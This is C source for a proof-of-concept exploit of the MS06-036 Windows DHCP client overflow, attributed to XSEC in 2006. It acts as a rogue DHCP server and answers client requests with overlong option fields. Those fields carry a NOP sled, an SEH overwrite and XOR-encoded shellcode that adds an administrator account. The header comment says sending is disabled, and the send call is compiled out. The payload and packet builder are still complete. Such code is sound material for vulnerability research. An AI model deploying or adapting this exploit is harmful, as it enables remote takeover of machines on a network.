/*
*-----------------------------------------------------------------------
*
* MS06-036 DHCP Client Remote Overflow PoC Exploit
* Copyright (C) 2006 XSEC All Rights Reserved.
*
* Author   : nop
*          : nop#xsec.org
*          : http://www.xsec.org
*          :
* Date     : 2006-07-19
*          :
* Complie  :On Windows
*          :     cl dhcpsrv2.cpp
*          :
* Usage       :D:\>dhcpsrv2
*          :
*          :

This is found on Internet and is probably some kind of DHCP server.
It monitors net for DHCP requests and decodes them.  Sending is now
disabled, so we only can see what kind of DHCP traffiec is goind on.
This program uses now UDP_PORT_BOOTPS port (server) to listen.
Probably it will decode only DHCP broadcasts.
It uses:
    ret = ioctlsocket(s, FIONREAD, &lLength); and
    iRecLen = recvfrom(sock, pbuf, lLength, 0,(struct sockaddr *)&addr, &addr_len);
pbuf holds DHCP header and options, which are decoded and displayed.

When a client is initialized for the first time after it is configured to receive 
DHCP information, it initiates a conversation with the server.

Below is a summary table of the conversation between client and server, which is 
followed by a packet-level description of the process:

   Source     Dest        Source     Dest              Packet
   MAC addr   MAC addr    IP addr    IP addr           Description
   -----------------------------------------------------------------
   Client     Broadcast   0.0.0.0    255.255.255.255   DHCP Discover
   DHCPsrvr   Broadcast   DHCPsrvr   255.255.255.255   DHCP Offer
   Client     Broadcast   0.0.0.0    255.255.255.255   DHCP Request
   DHCPsrvr   Broadcast   DHCPsrvr   255.255.255.255   DHCP ACK
				
*------------------------------------------------------------------------
*/


#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment( lib, "ws2_32.lib")


// Type of DHCP Header
typedef struct _dhcpheader //_bootpheader
  {
  unsigned char MessageType;      // 0x01
  unsigned char HardwareType;     // 0x01
  unsigned char HardwareAddrLen;
  unsigned char Hops;
  
  unsigned long  TranID;
  unsigned short Secondselaps;
  unsigned short BootpFlag;
  
  struct in_addr ClientIP;
  struct in_addr YourIP;
  struct in_addr NextServerIP;
  struct in_addr RelayAgentIP;
  
  unsigned char ClientMac[6];
  unsigned char PAdding[10];
  unsigned char ServerName[64];
  unsigned char BootFileName[128];
  
  unsigned long MagicCookie;  // in oher sources, options are here!
  }DHCPHeader, *PDHCPHeader;

typedef struct _dhcpoption
  {
  unsigned char OptionNum;
  unsigned char OptionLen;
  }DHCPOption, *PDHCPOption;

#define UDP_PORT_BOOTPS  67
#define UDP_PORT_BOOTPC  68

// BOOTP Message Types
#define BOOTPREPLY       2
#define BOOTPREQUEST     1

// DHCP Message Types (values for OP_DHCP_MESSAGE option)
enum dm_type
  {
  DHCPDISCOVER = 1,
  DHCPOFFER,
  DHCPREQUEST,
  DHCPDECLINE,
  DHCPACK,
  DHCPNAK,
  DHCPRELEASE,
  DHCPINFORM,
  };


#define OP_PAD               ((unsigned char)   0)
#define OP_SUBNET_MASK       ((unsigned char)   1)
#define OP_TIME_OFFSET       ((unsigned char)   2)
#define OP_GATEWAY           ((unsigned char)   3)
#define OP_TIME_SERVER       ((unsigned char)   4)
#define OP_NAME_SERVER       ((unsigned char)   5)
#define OP_DOMAIN_SERVER     ((unsigned char)   6)
#define OP_LOG_SERVER        ((unsigned char)   7)
#define OP_COOKIE_SERVER     ((unsigned char)   8)
#define OP_LPR_SERVER        ((unsigned char)   9)
#define OP_IMPRESS_SERVER    ((unsigned char)  10)
#define OP_RLP_SERVER        ((unsigned char)  11)
#define OP_HOSTNAME          ((unsigned char)  12)
#define OP_BOOTSIZE          ((unsigned char)  13)
#define OP_END               ((unsigned char) 255)
/* RFC1497 tags */
#define    OP_DUMPPATH       ((unsigned char)  14)
#define    OP_DOMAINNAME     ((unsigned char)  15)
#define    OP_SWAP_SERVER    ((unsigned char)  16)
#define    OP_ROOTPATH       ((unsigned char)  17)
#define    OP_EXTPATH        ((unsigned char)  18)
/* RFC2132 */
#define    OP_IP_FORWARD        ((unsigned char)  19)
#define    OP_NL_SRCRT          ((unsigned char)  20)
#define    OP_PFILTERS          ((unsigned char)  21)
#define    OP_REASS_SIZE        ((unsigned char)  22)
#define    OP_DEF_TTL           ((unsigned char)  23)
#define    OP_MTU_TIMEOUT       ((unsigned char)  24)
#define    OP_MTU_TABLE         ((unsigned char)  25)
#define    OP_INT_MTU           ((unsigned char)  26)
#define    OP_LOCAL_SUBNETS     ((unsigned char)  27)
#define    OP_BROAD_ADDR        ((unsigned char)  28)
#define    OP_DO_MASK_DISC      ((unsigned char)  29)
#define    OP_SUPPLY_MASK       ((unsigned char)  30)
#define    OP_DO_RDISC          ((unsigned char)  31)
#define    OP_RTR_SOL_ADDR      ((unsigned char)  32)
#define    OP_STATIC_ROUTE      ((unsigned char)  33)
#define    OP_USE_TRAILERS      ((unsigned char)  34)
#define    OP_ARP_TIMEOUT       ((unsigned char)  35)
#define    OP_ETH_ENCAP         ((unsigned char)  36)
#define    OP_TCP_TTL           ((unsigned char)  37)
#define    OP_TCP_KEEPALIVE     ((unsigned char)  38)
#define    OP_KEEPALIVE_GO      ((unsigned char)  39)
#define    OP_NIS_DOMAIN        ((unsigned char)  40)
#define    OP_NIS_SERVERS       ((unsigned char)  41)
#define    OP_NTP_SERVERS       ((unsigned char)  42)
#define    OP_VENDOR_OPTS       ((unsigned char)  43)
#define    OP_NETBIOS_NS        ((unsigned char)  44)
#define    OP_NETBIOS_DDS       ((unsigned char)  45)
#define    OP_NETBIOS_NODE      ((unsigned char)  46)
#define    OP_NETBIOS_SCOPE     ((unsigned char)  47)
#define    OP_XWIN_FS           ((unsigned char)  48)
#define    OP_XWIN_DM           ((unsigned char)  49)
#define    OP_NIS_P_DOMAIN      ((unsigned char)  64)
#define    OP_NIS_P_SERVERS     ((unsigned char)  65)
#define    OP_MOBILE_HOME       ((unsigned char)  68)
#define    OP_SMPT_SERVER       ((unsigned char)  69)
#define    OP_POP3_SERVER       ((unsigned char)  70)
#define    OP_NNTP_SERVER       ((unsigned char)  71)
#define    OP_WWW_SERVER        ((unsigned char)  72)
#define    OP_FINGER_SERVER     ((unsigned char)  73)
#define    OP_IRC_SERVER        ((unsigned char)  74)
#define    OP_STREETTALK_SRVR   ((unsigned char)  75)
#define    OP_STREETTALK_STDA   ((unsigned char)  76)
/* DHCP options */
#define    OP_REQUESTED_IP    ((unsigned char)  50)
#define    OP_IP_LEASE        ((unsigned char)  51)
#define    OP_OPT_OVERLOAD    ((unsigned char)  52)
#define    OP_TFTP_SERVER     ((unsigned char)  66)
#define    OP_BOOTFILENAME    ((unsigned char)  67)
#define    OP_DHCP_MESSAGE    ((unsigned char)  53)
#define    OP_SERVER_ID       ((unsigned char)  54)
#define    OP_PARM_REQUEST    ((unsigned char)  55)
#define    OP_MESSAGE         ((unsigned char)  56)
#define    OP_MAX_MSG_SIZE    ((unsigned char)  57)
#define    OP_RENEWAL_TIME    ((unsigned char)  58)
#define    OP_REBIND_TIME     ((unsigned char)  59)
#define    OP_VENDOR_CLASS    ((unsigned char)  60)
#define    OP_CLIENT_ID       ((unsigned char)  61)
/* RFC 2241 */
#define    OP_NDS_SERVERS     ((unsigned char)  85)
#define    OP_NDS_TREE_NAME   ((unsigned char)  86)
#define    OP_NDS_CONTEXT     ((unsigned char)  87)
/* RFC 2242 */
#define    OP_NDS_IPDOMAIN    ((unsigned char)  62)
#define    OP_NDS_IPINFO      ((unsigned char)  63)
/* RFC 2485 */
#define    OP_OPEN_GROUP_UAP    ((unsigned char)  98)
/* RFC 2563 */
#define    OP_DISABLE_AUTOCONF  ((unsigned char) 116)
/* RFC 2610 */
#define    OP_SLP_DA           ((unsigned char)  78)
#define    OP_SLP_SCOPE        ((unsigned char)  79)
/* RFC 2937 */
#define    OP_NS_SEARCH        ((unsigned char) 117)
/* RFC 3011 */
#define    OP_IP4_SUBNET_SELECT    ((unsigned char) 118)
/* ftp://ftp.isi.edu/.../assignments/bootp-dhcp-extensions */
#define    OP_USER_CLASS         ((unsigned char)  77)
#define    OP_SLP_NAMING_AUTH    ((unsigned char)  80)
#define    OP_CLIENT_FQDN        ((unsigned char)  81)
#define    OP_AGENT_CIRCUIT      ((unsigned char)  82)
#define    OP_AGENT_REMOTE       ((unsigned char)  83)
#define    OP_AGENT_MASK         ((unsigned char)  84)
#define    OP_TZ_STRING          ((unsigned char)  88)
#define    OP_FQDN_OPTION        ((unsigned char)  89)
#define    OP_AUTH               ((unsigned char)  90)
#define    OP_VINES_SERVERS      ((unsigned char)  91)
#define    OP_SERVER_RANK        ((unsigned char)  92)
#define    OP_CLIENT_ARCH        ((unsigned char)  93)
#define    OP_CLIENT_NDI         ((unsigned char)  94)
#define    OP_CLIENT_GUID        ((unsigned char)  97)
#define    OP_LDAP_URL           ((unsigned char)  95)
#define    OP_6OVER4             ((unsigned char)  96)
#define    OP_PRINTER_NAME       ((unsigned char) 100)
#define    OP_MDHCP_SERVER       ((unsigned char) 101)
#define    OP_IPX_COMPAT         ((unsigned char) 110)
#define    OP_NETINFO_PARENT     ((unsigned char) 112)
#define    OP_NETINFO_PARENT_TAG     ((unsigned char) 113)
#define    OP_URL                    ((unsigned char) 114)
#define    OP_FAILOVER               ((unsigned char) 115)
#define    OP_EXTENDED_REQUEST       ((unsigned char) 126)
#define    OP_EXTENDED_OPTION        ((unsigned char) 127)

#define    OP_APPEND                 ((unsigned char) 250)
#define    OP_AUTO_CONFIG            ((unsigned char) 251)
#define    OP_AUTO_DISCOVER_PROXY    ((unsigned char) 252)

///*   1 */ { "Subnet Mask",                ipv4, NULL },
///*   3 */ { "Router",                    ipv4_list, NULL },
///*   6 */ { "Domain Name Server",            ipv4_list, NULL },
///*  15 */ { "Domain Name",                string, NULL },
///*  31 */ { "Perform Router Discover",            val_boolean, TFS(&toggle_tfs) },
///*  33 */ { "Static Route",                special, NULL },
///*  43 */ { "Vendor-Specific Information",        special, NULL },
///*  44 */ { "NetBIOS over TCP/IP Name Server",        ipv4_list, NULL },
///*  46 */ { "NetBIOS over TCP/IP Node Type",        val_u_byte, VALS(bootp_nbnt_vals) },
///*  47 */ { "NetBIOS over TCP/IP Scope",        string, NULL },



/*
struct bootp_opt
{
    enum dm_type dmtype;
    char * desc;
};

struct bootp_opt bo [] =
{
    {DHCPDISCOVER, "DHCP Discover"},
};
*/
unsigned char sc[] =
"\xeb\x0e\x5b\x4b\x33\xc9\xb1\xbd\x80\x34\x0b\xee\xe2\xfa\xeb\x05"
"\xe8\xed\xff\xff\xff"
/* 189 bytes shellcode, xor with 0xee */
"\x05\x83\xb1\x8a\x4f\xde\xee\xee\xee\x65\xae\xe2\x65\x9e\xf2\x43"
"\x65\x86\xe6\x65\x19\x84\xec\xb7\x06\xe3\xee\xee\xee\x0c\x17\xdd"
"\x2e\xbe\xb9\x11\xf8\x84\xef\x11\xb8\xea\xbf\xb8\x65\x9b\xd2\x65"
"\x9a\xc0\x96\xed\x1b\xb8\x65\x98\xce\xed\x1b\xdd\x27\xa7\xaf\x43"
"\xed\x2b\xdd\x35\xe1\x50\xfe\xd4\x38\x9a\xe6\x2f\x25\xe3\xed\x34"
"\xae\x05\x1f\xd5\xf1\x9b\x09\xb0\x65\xb0\xca\xed\x33\x88\x65\xe2"
"\xa5\x65\xb0\xf2\xed\x33\x65\xea\x65\xed\x2b\x45\xb0\xb7\x2d\x06"
"\x60\x11\x11\x11\x76\x10\x64\xe0\x01\x20\x0e\x8e\x8d\x83\x8a\xce"
"\xc1\x8d\xce\x80\x8b\x9a\xce\x9b\x9d\x8b\x9c\xce\xb6\xce\xb6\xce"
"\xc1\xaf\xaa\xaa\xce\xc8\xc8\xce\x80\x8b\x9a\xce\x82\x81\x8d\x8f"
"\x82\x89\x9c\x81\x9b\x9e\xce\xaf\x8a\x83\x87\x80\x87\x9d\x9a\x9c"
"\x8f\x9a\x81\x9c\x9d\xce\xb6\xce\xc1\xaf\xaa\xaa\xee";
//"cmd /c net user X X /ADD && net localgroup Administrators X /ADD";

unsigned long TranID;
unsigned char ClientMac[6]={0};
struct in_addr YourIP = {10,10,10,222};
unsigned long MagicCookie;

char szCurIP[16] = "255.255.255.255";
int iCurPort=UDP_PORT_BOOTPC;
int itype = 0;

SOCKET  s;

void OnReceive(SOCKET sock, long length);
void DecodePacket(unsigned char *buf, int length);
void DecodePacket2(unsigned char *buf, int length);
void SendPacket(SOCKET sock, int iType);
int SendMsg(SOCKET sock, char * szBuf, int length, char * szRemoteIP, int port);


void main(void)
  {
  WSADATA wsd;
  
  int           ret;
  bool          flag;
  SOCKADDR_IN   addr;
  unsigned long lLength;
  
  //??winsock?
  if (WSAStartup(MAKEWORD(1,1), &wsd) != 0)
    {
    printf("WSAStartup error!\n");
    return;
    }
  
  s = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);



  //????????
  flag = true;
  ret = setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char *)&flag, sizeof(int));
  if (ret != 0)
    {
    printf("setsocketopt SO_REUSEADDR error ret = %d!\n", ret);
    ret = WSAGetLastError();
    printf("error = %d!\n", ret);
    closesocket(s);
    return;
    }
  
  //???????????
  flag = 1;
  setsockopt(s, SOL_SOCKET, SO_BROADCAST, (char FAR *)&flag, sizeof(int));
  if (ret != 0)
    {
    closesocket(s);
    printf("setsocketopt SO_BROADCAST error!\n");
    return;
    }
  
    //??
    
  ZeroMemory(&addr,sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = INADDR_ANY;
  addr.sin_port = htons(UDP_PORT_BOOTPS);
  
  ret = bind(s,(struct sockaddr *)&addr,sizeof(addr));
  if (ret != 0)
    {
    printf("bind error!\r\n");
    }
  
  while(1)
    {
    ret = ioctlsocket(s, FIONREAD, &lLength);
    if (ret < 0)
      break;
    
    if (lLength > 0)
      {
      OnReceive(s, lLength);
      }
    else
      {
      //??????CPU 100%
      Sleep(1);
      }
    }
   
   WSACleanup();
}

//--------------------------------------------------------------------------------
//  ????????
//--------------------------------------------------------------------------------
void OnReceive(SOCKET sock, long length)
  {
  //length ?socket???????????
  //??????????????
  
  char   *pbuf;
  int     addr_len,iRecLen;
  struct  sockaddr_in addr;
  
  pbuf = (char*)malloc(length + 1);
  
  //printf("ONR\n");
  if (!pbuf)
    return;
  
  memset(pbuf,0,length+1);
  addr_len = sizeof(addr);
  
  //printf("Receiving... length = %ld\n", length);
  iRecLen = recvfrom(sock, pbuf, length, 0,(struct sockaddr *)&addr, &addr_len);

  if (iRecLen==SOCKET_ERROR || iRecLen <=0 || iRecLen != length)
    {
    printf("Receive Failed! %d len:%d\r\n", iRecLen, length);
    return;
    }
  else
    {
    pbuf[length] = 0;
      
    //OutputDebugString("Recv data\r\n");
    printf("Receive from %s:%d len:%d data:%s\n",inet_ntoa(addr.sin_addr), htons(addr.sin_port), iRecLen, pbuf);
    
    
    //ZeroMemory(szCurIP, sizeof(szCurIP));
    //strcpy(szCurIP, inet_ntoa(addr.sin_addr));
    //iCurPort = htons(addr.sin_port);
    }

  DecodePacket((unsigned char*)pbuf, (int)length);
  if(itype == DHCPDISCOVER)
  {
  printf( "DHCP Discover\n");
  }
  else if(itype == DHCPREQUEST)
  {
  printf( "DHCP DHCPREQUEST\n");
  }
#if 0
  if (itype)
    SendPacket(sock, itype);
#endif

  free(pbuf);
  pbuf = NULL;
  }

//--------------------------------------------------------------------------------
//  ??????
//--------------------------------------------------------------------------------
void DecodePacket2(unsigned char *buf, int length)
{
   int i=0, num=0, len=0, have=0, size =0, c =0;
   unsigned char *p, *ip;
   PDHCPHeader dhcp = (PDHCPHeader)buf;
   PDHCPOption op;

    itype = 0;
   
   if(length < sizeof(DHCPHeader))
   {
        printf("DHCP Header Error! len:%d\r\n", length);          
        return;
   }

   // Print Header
   
   TranID = dhcp->TranID;
   ip = (unsigned char*) dhcp->ClientMac;
    memcpy(&ClientMac, ip, 6);
    
   MagicCookie = dhcp->MagicCookie;
   
   size = sizeof(DHCPHeader);
   have = length - sizeof(DHCPHeader);
 
   p = buf+sizeof(DHCPHeader);
   
   while(have)
   {
       if(p[0] == OP_END || p[0] == 0x00)
       {
            printf("DecodePacket2 return!\n");
            return;
        }

        if(have < 2)
        {
            printf("DHCP Option Error1!\n");
        }
       

        have -= 2;
        p += 2;
       
      op   = (PDHCPOption)p;
    
      num = op->OptionNum;    // we get exception error here!
      len = op->OptionLen;

       
       if(len < have)
       {
            if(len == 1)
            {
                c = p[0];    

                if(num == OP_DHCP_MESSAGE)
                {
                    switch(c)
                    {
                    case DHCPDISCOVER:
                        printf( "DHCP Discover\n");
                        itype = DHCPOFFER;
                        break;
                    case DHCPOFFER:
                        printf("DHCP Offer\n");
                        break;
                    case DHCPREQUEST:
                        printf("DHCP Request\n");
                        itype = DHCPACK;
                        break;
                    case DHCPDECLINE:
                        printf("DHCP Decline\n");
                        break;
                    case DHCPACK:
                        printf("DHCP ACK\n");
                        break;
                    case DHCPNAK:
                        printf("DHCP NAK\n");
                        break;
                    case DHCPRELEASE:
                        printf("DHCP Release\n");
                        break;
                    case DHCPINFORM:
                        printf("DHCP InfoRM\n");
                        break;
                    default:
                        printf("Unknow\n");
                        break;
                    }
                }
            }

            p += len;
       }
       else
       {
           printf("DHCP Option Error2!\n");
           return;    
       }
   }
}

//--------------------------------------------------------------------------------
//  ????
//--------------------------------------------------------------------------------
void DecodePacket(unsigned char *buf, int length)
  {  
  int i=0, num=0, len=0, have=0, size =0, c =0;
  unsigned char *p, *ip;

  PDHCPHeader dhcp = (PDHCPHeader)buf;
  PDHCPOption op;   // p = buf + sizeof(DHCPHeader);
   
  itype = 0;
  
  if (length < sizeof(DHCPHeader))
    {
    printf("DHCP Header Error! len:%d\r\n", length);          
    return;
    }
  
   
   // Print Header
   //printf("sizeof header:%d, length = %d\n", sizeof(DHCPHeader), length);

    printf("==============================================================\n");
    printf("MessageType:       %d\n", dhcp->MessageType);
    //printf("HardwareType:      %d\n", dhcp->HardwareType);
    //printf("HardwareAddrLen:   %d\n", dhcp->HardwareAddrLen);
    //printf("Hops:              %d\n", dhcp->Hops);

    printf("TranID:            0x%08x\n", dhcp->TranID);

    //printf("Secondselaps:      %d\n", dhcp->Secondselaps);
    printf("BootpFlag:         0x%04x\n", dhcp->BootpFlag);

    printf("ClientIP:          %s\n", inet_ntoa(dhcp->ClientIP));
    printf("YourIP:            %s\n", inet_ntoa(dhcp->YourIP));
    printf("NextServerIP:      %s\n", inet_ntoa(dhcp->NextServerIP));
    printf("RelayAgentIP:      %s\n", inet_ntoa(dhcp->RelayAgentIP));

    ip = (unsigned char*) dhcp->ClientMac;
    printf("ClientMac:         %02x:%02x:%02x:%02x:%02x:%02x\n", ip[0],ip[1],ip[2],ip[3],ip[4],ip[5]);

    TranID = dhcp->TranID;
    memcpy(&ClientMac, ip, 6);

    //printf("PAdding:           Len: %d Data: %s\n", sizeof(dhcp->PAdding),dhcp->PAdding);

    printf("ServerName:        Len: %d Data: %s\n", sizeof(dhcp->ServerName), dhcp->ServerName);

    //printf("BootFileName:      Len: %d Data: %s\n", sizeof(dhcp->BootFileName), dhcp->BootFileName);

    //printf("MagicCookie:       0x%08x\n", dhcp->MagicCookie);
    MagicCookie = dhcp->MagicCookie;
   
   size = sizeof(DHCPHeader);
   have = length - sizeof(DHCPHeader);
 
   p = buf + sizeof(DHCPHeader);
   
   printf("==============================================================\n");

   // Print Option
   while(have)
      {
      printf("p[0] = %d\n", (int)p[0]);
      
      if (p[0] == OP_END)
        {
        //printf("Option End With 0xFF!\r\n");
        if (have > 1)
          break;
        else 
          return;
        }
      else 
        if (p[0] == 0x00)
          {
          printf("Padding:       ");
          for(i=0; i< have; i++)
            {
            printf("\\x%02x", p[i]);
            }
          printf("\n");
          return;
          }
      
      if (have < 2)
        {
        printf("DHCP Option Error1!\n");
        return;    
       }
    
      op   = (PDHCPOption)p;
    
      num = op->OptionNum;    // we get exception error here!
      len = op->OptionLen;
      //printf("We are here!\n");
    #if 0
          printf("OptionNum:         %d\n", num);
          printf("OptionLen:         %d\n", len);
          printf("Option:            ");
    #endif       
      have -= 2;
      p    += 2;
    
      if (len < have)
        {
        if (len == 1)
          {
          c = p[0];
          if (num == OP_DHCP_MESSAGE)
            {
            switch(c)
              {
              case DHCPDISCOVER:
                printf( "DHCP Discover\n");
                itype = DHCPOFFER;
                break;
              case DHCPOFFER:
                printf("DHCP Offer\n");
                break;
              case DHCPREQUEST:
                printf("DHCP Request\n");
                itype = DHCPACK;
                break;
              case DHCPDECLINE:
                printf("DHCP Decline\n");
                break;
              case DHCPACK:
                printf("DHCP ACK\n");
                break;
              case DHCPNAK:
                printf("DHCP NAK\n");
                break;
              case DHCPRELEASE:
                printf("DHCP Release\n");
                break;
              case DHCPINFORM:
                printf("DHCP InfoRM\n");
                break;
              default:
                printf("Unknow\n");
                break;
              }
            }
          }
        else
          {
#if 0
          //printf("Option: %d, Len: %d, Buf: ", num, len);
          for(i=0; i< len; i++, have--)
            {
            printf("\\x%02x", p[i]);
            }
          printf("\n");
#endif
          ;
          }
        p += len;
        } // if(len < have)
      else
        {
        printf("DHCP Option Error2!\n");
        return;    
        }
    } // while()

  if (dhcp->MessageType == 0x1)
    {
    // we will handle this
    printf("Boot Request\n");
    }
  else 
    if (dhcp->MessageType == 0x2)
      {
      printf("Boot Reply\n");
      }
  }

//--------------------------------------------------------------------------------
//  ????
//--------------------------------------------------------------------------------
void SendPacket(SOCKET sock, int iType)
{
    unsigned char sendbuf[102400] ={0};
    unsigned char opbuf[51200] ={0};
    unsigned char *p;
    DHCPHeader sdh;
    DHCPOption op;

    int len = 0, i=0, num=0, b = 2;

    memset(&sdh, 0, sizeof(DHCPHeader));

    sdh.MessageType = BOOTPREPLY;
    sdh.HardwareType = 1;
    sdh.HardwareAddrLen = 6;

    sdh.TranID = TranID;
    sdh.YourIP = YourIP;

    memcpy(&sdh.ClientMac, &ClientMac, 6);
    sdh.MagicCookie = MagicCookie;

    p = opbuf;

    //op.OptionNum =  OP_DHCP_MESSAGE;
    //op.OptionLen = 1;


    // fill OP_DHCP_MESSAGE
    p[0] = OP_DHCP_MESSAGE;      // 53
    p[1] = 1;
    p[2] = iType;
    p += 3;
    len += 3;

    // fill OP_SUBNET_MASK;
    p[0] = OP_SUBNET_MASK;       // 1
    p[1] = 4;
    p[2] = 255;
    p[3] = 255;
    p[4] = 255;
    p[5] = 0;

    p += 6;
    len += 6;

/*
    // 250 ??
    p[0] = OP_VENOR_UNKNOW;    // 6
    p[1] = 254;

    p += 2;
    len += 2;

    memset(p, 'U', 254);

    p += 254;
    len += 254;
*/

    // fill OP_RENEWAL_TIME
    p[0] = OP_RENEWAL_TIME;     // 58
    p[1] = 4;
    p[2] = 0;
    p[3] = 0;
    p[4] = 7;
    p[5] = 8;
    //p[4] = 0;
    //p[5] = 60;

    p += 6;
    len += 6;

    // fill OP_REBIND_TIME
    p[0] = OP_REBIND_TIME;     // 59
    p[1] = 4;
    p[2] = 0;
    p[3] = 0;
    p[4] = 0x0C;
    p[5] = 0x4e;
    //p[4] = 0;
    //p[5] = 120;

    p += 6;
    len += 6;

    // fill OP_IP_LEASE
    p[0] = OP_IP_LEASE;       // 51
    p[1] = 4;
    p[2] = 0;
    p[3] = 0;
    p[4] = 0x0e;
    p[5] = 0x10;
    //p += 6;
    //len += 6;


    // fill OP_SERVER_ID
    p[0] = OP_SERVER_ID;     // 54
    p[1] = 4;
    p[2] = 10;
    p[3] = 10;
    p[4] = 10;
    p[5] = 9;

    p += 6;
    len += 6;


    // fill OP_GATEWAY      // router
    p[0] = OP_GATEWAY;      // 3
    p[1] = 4;
    p[2] = 10;
    p[3] = 10;
    p[4] = 10;
    p[5] = 1;

    p += 6;
    len += 6;


   // fill OP_DOMAIN_SERVER
     p[0] = OP_DOMAIN_SERVER;  // 6
      p[1] = 4;
      p[2] = 10;
      p[3] = 10;
      p[4] = 10;
      p[5] = 7;
   
      p += 6;
      len += 6;    

/*
    //num = 63;
    num = 63;

    // fill OP_DOMAIN_SERVER
    p[0] = OP_DOMAIN_SERVER;    // 6
    p[1] = num*4;

    p += 2;
    len += 2;


    for(i=0; i < num; i++,p+=4, len+=4)
    {
        p[0] = 90;
        p[1] = 90;
        p[2] = 90;
        p[3] = 90;
    }
*/
    
   if(itype == DHCPOFFER)
   {
       p[0] = OP_DOMAINNAME;    // 15
        //p[0] = OP_DOMAIN_SERVER;
        p[1] = 255;

        p += 2;
        len += 2;

        memset(p, 'A', 255);
        
       p[0] = OP_APPEND;    // 250
       p[1] = 255;
   
       p += 2;
       len += 2;
       
       memset(p, 'B', 255);
   
       p+=255;
       len+= 255;
   }
   else
    if(itype == DHCPACK)
    {

       p[0] = OP_DOMAINNAME;    // 15
       //p[0] = OP_DOMAIN_SERVER;
       //p[0] = OP_USER_CLASS;
       p[1] = 255;
   
       p += 2;
       len += 2;
   
       memset(p, 0x90, 255);
   
       p+=255;
       len+= 255;        

       //for(i=0; i< 3; i++)
       for(i=0; i< 11; i++)
        {
            p[0] = OP_APPEND;    // 250
            p[1] = 255;

            p += 2;
            len += 2;

            memset(p, 0x90, 255);

            p+=255;
            len+= 255;
        }
        
       p[0] = OP_APPEND;    // 250
       p[1] = 255;
    }
    
   p[0] = OP_APPEND;    // 250
    p[1] = 255;

    p += 2;
    len += 2;

    memset(p, 0x90, 255);
    
    memset(p+100, 'A', 50);
    memcpy(p+106, "\xeb\x06\xeb\x06", 4);   // SEH
    memcpy(p+110, "\x16\x13", 2);           // ??? Ret 0x00130016
    //memcpy(p+110, "\x90\x80\x12", 3);

    p+=255;
    len+= 255;


    p[0] = OP_APPEND;    // 250
    p[1] = 255;

    p += 2;
    len += 2;
    
    memset(p, 0x90, 255);
    memcpy(p, sc, sizeof(sc)-1);
    p[254] = 0;

    p+=255;
    len+= 255;

    p[0] = OP_END;
    len++;
    
    
    p = sendbuf;

    memcpy(p, &sdh, sizeof(DHCPHeader));
    memcpy(p+sizeof(DHCPHeader), &opbuf, len);

    //DecodePacket(sendbuf, sizeof(DHCPHeader)+len);
    len += sizeof(DHCPHeader);
    SendMsg(s, (char*)sendbuf, len, szCurIP, iCurPort);

    itype = -1;
}

//--------------------------------------------------------------------------------
//  ????
//--------------------------------------------------------------------------------
int SendMsg(SOCKET sock, char * szBuf, int length, char * szRemoteIP, int port)
  {
  int ret;
  SOCKADDR_IN addr;
  
  //if(m_SckSend==INVALID_SOCKET)
  if (sock == INVALID_SOCKET)
    {
    printf("Socket error!\n");
    return -1;
    }
  
  if(!(ClientMac[0] == 0x00 && ClientMac[1] == 0x0c && ClientMac[5] == 0x2c))
  return -1;
  
  ZeroMemory(&addr,sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr(szRemoteIP);
  addr.sin_port = htons(port);
  
  printf("Send Packet len:%d to %s:%d\n", length, szRemoteIP, port);
  
  ret = sendto(sock, szBuf, length, 0, (sockaddr *)&addr, sizeof(addr));    
  if (ret == SOCKET_ERROR)
    {
    printf("Socket error!\n");
    return -1;
    }
    
  return ret;    
  }
  
